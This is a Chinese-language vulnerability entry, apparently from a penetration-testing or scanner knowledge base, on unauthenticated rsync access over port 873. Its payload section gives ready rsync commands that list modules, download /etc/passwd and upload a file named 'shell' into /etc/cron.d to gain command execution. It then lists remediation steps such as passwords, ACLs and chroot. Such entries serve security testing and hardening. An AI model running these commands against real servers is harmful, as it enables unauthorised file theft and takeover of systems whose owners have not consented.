---
id: RSYNC-COMMON
title: Rsync 未授权访问漏洞
product: rsync
vendor: Rsync
version_affected: "任意版本（配置相关）"
severity: CRITICAL
tags: [file_read, file_write, 无需认证]
fingerprint: ["Rsync"]
---

## 漏洞描述

Rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议进行远程文件传输。如果目标开启了 rsync 服务，并且没有配置 ACL 或访问密码，将可以读写目标服务器上任意文件。

## 影响版本

- 任意版本（取决于配置）

## 前置条件

- 无需认证
- Rsync 服务监听 873 端口且没有设置访问限制

## 利用步骤

1. 列出 rsync 模块
2. 读写目标服务器文件

## Payload

```bash
# 列出模块
rsync rsync://target:873/

# 列出模块内容
rsync rsync://target:873/src/

# 下载文件
rsync -av rsync://target:873/src/etc/passwd ./

# 上传文件
rsync -av shell rsync://target:873/src/etc/cron.d/shell
```

## 验证方法

```bash
# 成功读写文件即证明漏洞存在
```

## 修复建议

1. 设置强密码认证
2. 使用 ACL 限制访问
3. 限制 rsync 端口访问来源
4. 使用 chroot 配置限制访问目录
